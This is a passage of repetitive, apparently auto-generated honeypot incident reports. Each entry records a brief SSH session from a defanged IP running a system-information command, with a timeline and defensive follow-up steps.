| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:00:03` | `cowrie.session.connect` |
| `2026-06-25 08:00:03` | `cowrie.client.version` |
| `2026-06-25 08:00:03` | `cowrie.client.kex` |
| `2026-06-25 08:00:04` | `cowrie.login.success` |
| `2026-06-25 08:00:05` | `cowrie.session.params` |
| `2026-06-25 08:00:05` | `cowrie.command.input` |
| `2026-06-25 08:00:06` | `cowrie.log.closed` |
| `2026-06-25 08:00:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74f296dc7a6e

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:00 |
| **Last Seen** | 2026-06-25 08:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:00:05` | `cowrie.session.connect` |
| `2026-06-25 08:00:05` | `cowrie.client.version` |
| `2026-06-25 08:00:06` | `cowrie.client.kex` |
| `2026-06-25 08:00:06` | `cowrie.login.success` |
| `2026-06-25 08:00:07` | `cowrie.session.params` |
| `2026-06-25 08:00:07` | `cowrie.command.input` |
| `2026-06-25 08:00:08` | `cowrie.log.closed` |
| `2026-06-25 08:00:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b43fbcdb661d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:00 |
| **Last Seen** | 2026-06-25 08:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:00:40` | `cowrie.session.connect` |
| `2026-06-25 08:00:40` | `cowrie.client.version` |
| `2026-06-25 08:00:41` | `cowrie.client.kex` |
| `2026-06-25 08:00:41` | `cowrie.login.success` |
| `2026-06-25 08:00:42` | `cowrie.session.params` |
| `2026-06-25 08:00:42` | `cowrie.command.input` |
| `2026-06-25 08:00:42` | `cowrie.log.closed` |
| `2026-06-25 08:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05034776084b

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:00 |
| **Last Seen** | 2026-06-25 08:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:00:53` | `cowrie.session.connect` |
| `2026-06-25 08:00:53` | `cowrie.client.version` |
| `2026-06-25 08:00:54` | `cowrie.client.kex` |
| `2026-06-25 08:00:54` | `cowrie.login.success` |
| `2026-06-25 08:00:55` | `cowrie.session.params` |
| `2026-06-25 08:00:55` | `cowrie.command.input` |
| `2026-06-25 08:00:55` | `cowrie.log.closed` |
| `2026-06-25 08:00:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fea4310c9bea

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:01 |
| **Last Seen** | 2026-06-25 08:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:01:22` | `cowrie.session.connect` |
| `2026-06-25 08:01:22` | `cowrie.client.version` |
| `2026-06-25 08:01:22` | `cowrie.client.kex` |
| `2026-06-25 08:01:23` | `cowrie.login.success` |
| `2026-06-25 08:01:23` | `cowrie.session.params` |
| `2026-06-25 08:01:23` | `cowrie.command.input` |
| `2026-06-25 08:01:24` | `cowrie.log.closed` |
| `2026-06-25 08:01:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fca95b3216af

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:02 |
| **Last Seen** | 2026-06-25 08:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:02:05` | `cowrie.session.connect` |
| `2026-06-25 08:02:05` | `cowrie.client.version` |
| `2026-06-25 08:02:05` | `cowrie.client.kex` |
| `2026-06-25 08:02:05` | `cowrie.login.success` |
| `2026-06-25 08:02:06` | `cowrie.session.params` |
| `2026-06-25 08:02:06` | `cowrie.command.input` |
| `2026-06-25 08:02:06` | `cowrie.log.closed` |
| `2026-06-25 08:02:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bf3d7233565

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:02 |
| **Last Seen** | 2026-06-25 08:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:02:10` | `cowrie.session.connect` |
| `2026-06-25 08:02:10` | `cowrie.client.version` |
| `2026-06-25 08:02:11` | `cowrie.client.kex` |
| `2026-06-25 08:02:11` | `cowrie.login.success` |
| `2026-06-25 08:02:12` | `cowrie.session.params` |
| `2026-06-25 08:02:12` | `cowrie.command.input` |
| `2026-06-25 08:02:13` | `cowrie.log.closed` |
| `2026-06-25 08:02:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7221e0ab8b5a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:02 |
| **Last Seen** | 2026-06-25 08:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:02:51` | `cowrie.session.connect` |
| `2026-06-25 08:02:51` | `cowrie.client.version` |
| `2026-06-25 08:02:52` | `cowrie.client.kex` |
| `2026-06-25 08:02:52` | `cowrie.login.success` |
| `2026-06-25 08:02:53` | `cowrie.session.params` |
| `2026-06-25 08:02:53` | `cowrie.command.input` |
| `2026-06-25 08:02:53` | `cowrie.log.closed` |
| `2026-06-25 08:02:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77fc8c93ddc9

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:03 |
| **Last Seen** | 2026-06-25 08:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:03:07` | `cowrie.session.connect` |
| `2026-06-25 08:03:07` | `cowrie.client.version` |
| `2026-06-25 08:03:08` | `cowrie.client.kex` |
| `2026-06-25 08:03:08` | `cowrie.login.success` |
| `2026-06-25 08:03:09` | `cowrie.session.params` |
| `2026-06-25 08:03:09` | `cowrie.command.input` |
| `2026-06-25 08:03:09` | `cowrie.log.closed` |
| `2026-06-25 08:03:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf68b7a812e1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:03 |
| **Last Seen** | 2026-06-25 08:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:03:36` | `cowrie.session.connect` |
| `2026-06-25 08:03:36` | `cowrie.client.version` |
| `2026-06-25 08:03:36` | `cowrie.client.kex` |
| `2026-06-25 08:03:36` | `cowrie.login.success` |
| `2026-06-25 08:03:37` | `cowrie.session.params` |
| `2026-06-25 08:03:37` | `cowrie.command.input` |
| `2026-06-25 08:03:37` | `cowrie.log.closed` |
| `2026-06-25 08:03:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7c248d23595

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:04 |
| **Last Seen** | 2026-06-25 08:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:04:04` | `cowrie.session.connect` |
| `2026-06-25 08:04:04` | `cowrie.client.version` |
| `2026-06-25 08:04:04` | `cowrie.client.kex` |
| `2026-06-25 08:04:04` | `cowrie.login.success` |
| `2026-06-25 08:04:06` | `cowrie.session.params` |
| `2026-06-25 08:04:06` | `cowrie.command.input` |
| `2026-06-25 08:04:06` | `cowrie.log.closed` |
| `2026-06-25 08:04:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1592d43200f4

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:04 |
| **Last Seen** | 2026-06-25 08:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:04:09` | `cowrie.session.connect` |
| `2026-06-25 08:04:09` | `cowrie.client.version` |
| `2026-06-25 08:04:10` | `cowrie.client.kex` |
| `2026-06-25 08:04:10` | `cowrie.login.success` |
| `2026-06-25 08:04:11` | `cowrie.session.params` |
| `2026-06-25 08:04:11` | `cowrie.command.input` |
| `2026-06-25 08:04:11` | `cowrie.log.closed` |
| `2026-06-25 08:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d65d9c019cd

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:04 |
| **Last Seen** | 2026-06-25 08:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:04:19` | `cowrie.session.connect` |
| `2026-06-25 08:04:19` | `cowrie.client.version` |
| `2026-06-25 08:04:19` | `cowrie.client.kex` |
| `2026-06-25 08:04:19` | `cowrie.login.success` |
| `2026-06-25 08:04:20` | `cowrie.session.params` |
| `2026-06-25 08:04:20` | `cowrie.command.input` |
| `2026-06-25 08:04:20` | `cowrie.log.closed` |
| `2026-06-25 08:04:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54f71efd132d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:05 |
| **Last Seen** | 2026-06-25 08:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:05:03` | `cowrie.session.connect` |
| `2026-06-25 08:05:03` | `cowrie.client.version` |
| `2026-06-25 08:05:04` | `cowrie.client.kex` |
| `2026-06-25 08:05:04` | `cowrie.login.success` |
| `2026-06-25 08:05:05` | `cowrie.session.params` |
| `2026-06-25 08:05:05` | `cowrie.command.input` |
| `2026-06-25 08:05:05` | `cowrie.log.closed` |
| `2026-06-25 08:05:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2167b580caf2

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:05 |
| **Last Seen** | 2026-06-25 08:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:05:14` | `cowrie.session.connect` |
| `2026-06-25 08:05:14` | `cowrie.client.version` |
| `2026-06-25 08:05:14` | `cowrie.client.kex` |
| `2026-06-25 08:05:15` | `cowrie.login.success` |
| `2026-06-25 08:05:16` | `cowrie.session.params` |
| `2026-06-25 08:05:16` | `cowrie.command.input` |
| `2026-06-25 08:05:16` | `cowrie.log.closed` |
| `2026-06-25 08:05:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8597b51603c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:05 |
| **Last Seen** | 2026-06-25 08:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:05:47` | `cowrie.session.connect` |
| `2026-06-25 08:05:47` | `cowrie.client.version` |
| `2026-06-25 08:05:47` | `cowrie.client.kex` |
| `2026-06-25 08:05:48` | `cowrie.login.success` |
| `2026-06-25 08:05:49` | `cowrie.session.params` |
| `2026-06-25 08:05:49` | `cowrie.command.input` |
| `2026-06-25 08:05:49` | `cowrie.log.closed` |
| `2026-06-25 08:05:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58a8f9eb24e9

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:06 |
| **Last Seen** | 2026-06-25 08:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:06:12` | `cowrie.session.connect` |
| `2026-06-25 08:06:12` | `cowrie.client.version` |
| `2026-06-25 08:06:12` | `cowrie.client.kex` |
| `2026-06-25 08:06:13` | `cowrie.login.success` |
| `2026-06-25 08:06:14` | `cowrie.session.params` |
| `2026-06-25 08:06:14` | `cowrie.command.input` |
| `2026-06-25 08:06:14` | `cowrie.log.closed` |
| `2026-06-25 08:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f25556699453

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:06 |
| **Last Seen** | 2026-06-25 08:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:06:32` | `cowrie.session.connect` |
| `2026-06-25 08:06:32` | `cowrie.client.version` |
| `2026-06-25 08:06:32` | `cowrie.client.kex` |
| `2026-06-25 08:06:32` | `cowrie.login.success` |
| `2026-06-25 08:06:33` | `cowrie.session.params` |
| `2026-06-25 08:06:33` | `cowrie.command.input` |
| `2026-06-25 08:06:33` | `cowrie.log.closed` |
| `2026-06-25 08:06:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92a72920392d

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 08:06 |
| **Last Seen** | 2026-06-25 08:06 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:06:39` | `cowrie.session.connect` |
| `2026-06-25 08:06:41` | `cowrie.client.version` |
| `2026-06-25 08:06:41` | `cowrie.client.kex` |
| `2026-06-25 08:06:48` | `cowrie.login.success` |
| `2026-06-25 08:06:52` | `cowrie.session.params` |
| `2026-06-25 08:06:52` | `cowrie.command.input` |
| `2026-06-25 08:06:54` | `cowrie.log.closed` |
| `2026-06-25 08:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22c24c5ca4f0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:07 |
| **Last Seen** | 2026-06-25 08:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:07:17` | `cowrie.session.connect` |
| `2026-06-25 08:07:17` | `cowrie.client.version` |
| `2026-06-25 08:07:17` | `cowrie.client.kex` |
| `2026-06-25 08:07:18` | `cowrie.login.success` |
| `2026-06-25 08:07:18` | `cowrie.session.params` |
| `2026-06-25 08:07:18` | `cowrie.command.input` |
| `2026-06-25 08:07:19` | `cowrie.log.closed` |
| `2026-06-25 08:07:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b16c6d764328

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:08 |
| **Last Seen** | 2026-06-25 08:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:08:07` | `cowrie.session.connect` |
| `2026-06-25 08:08:07` | `cowrie.client.version` |
| `2026-06-25 08:08:07` | `cowrie.client.kex` |
| `2026-06-25 08:08:07` | `cowrie.login.success` |
| `2026-06-25 08:08:08` | `cowrie.session.params` |
| `2026-06-25 08:08:08` | `cowrie.command.input` |
| `2026-06-25 08:08:08` | `cowrie.log.closed` |
| `2026-06-25 08:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29085dc92bc7

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:08 |
| **Last Seen** | 2026-06-25 08:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:08:23` | `cowrie.session.connect` |
| `2026-06-25 08:08:23` | `cowrie.client.version` |
| `2026-06-25 08:08:23` | `cowrie.client.kex` |
| `2026-06-25 08:08:24` | `cowrie.login.success` |
| `2026-06-25 08:08:25` | `cowrie.session.params` |
| `2026-06-25 08:08:25` | `cowrie.command.input` |
| `2026-06-25 08:08:25` | `cowrie.log.closed` |
| `2026-06-25 08:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-970e7e5f5269

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:08 |
| **Last Seen** | 2026-06-25 08:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:08:53` | `cowrie.session.connect` |
| `2026-06-25 08:08:53` | `cowrie.client.version` |
| `2026-06-25 08:08:53` | `cowrie.client.kex` |
| `2026-06-25 08:08:53` | `cowrie.login.success` |
| `2026-06-25 08:08:54` | `cowrie.session.params` |
| `2026-06-25 08:08:54` | `cowrie.command.input` |
| `2026-06-25 08:08:54` | `cowrie.log.closed` |
| `2026-06-25 08:08:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b963431d6336

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:09 |
| **Last Seen** | 2026-06-25 08:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:09:14` | `cowrie.session.connect` |
| `2026-06-25 08:09:14` | `cowrie.client.version` |
| `2026-06-25 08:09:14` | `cowrie.client.kex` |
| `2026-06-25 08:09:15` | `cowrie.login.success` |
| `2026-06-25 08:09:16` | `cowrie.session.params` |
| `2026-06-25 08:09:16` | `cowrie.command.input` |
| `2026-06-25 08:09:16` | `cowrie.log.closed` |
| `2026-06-25 08:09:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7c673628873

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 08:09 |
| **Last Seen** | 2026-06-25 08:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:09:37` | `cowrie.session.connect` |
| `2026-06-25 08:09:37` | `cowrie.client.version` |
| `2026-06-25 08:09:37` | `cowrie.client.kex` |
| `2026-06-25 08:09:37` | `cowrie.login.success` |
| `2026-06-25 08:09:38` | `cowrie.session.params` |
| `2026-06-25 08:09:38` | `cowrie.command.input` |
| `2026-06-25 08:09:38` | `cowrie.log.closed` |
| `2026-06-25 08:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94bdcdf7db2e

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:10 |
| **Last Seen** | 2026-06-25 08:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 08:10:21` | `cowrie.session.connect` |
| `2026-06-25 08:10:21` | `cowrie.client.version` |
| `2026-06-25 08:10:21` | `cowrie.client.kex` |
| `2026-06-25 08:10:22` | `cowrie.login.success` |
| `2026-06-25 08:10:23` | `cowrie.session.params` |
| `2026-06-25 08:10:23` | `cowrie.command.input` |
| `2026-06-25 08:10:23` | `cowrie.log.closed` |
| `2026-06-25 08:10:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
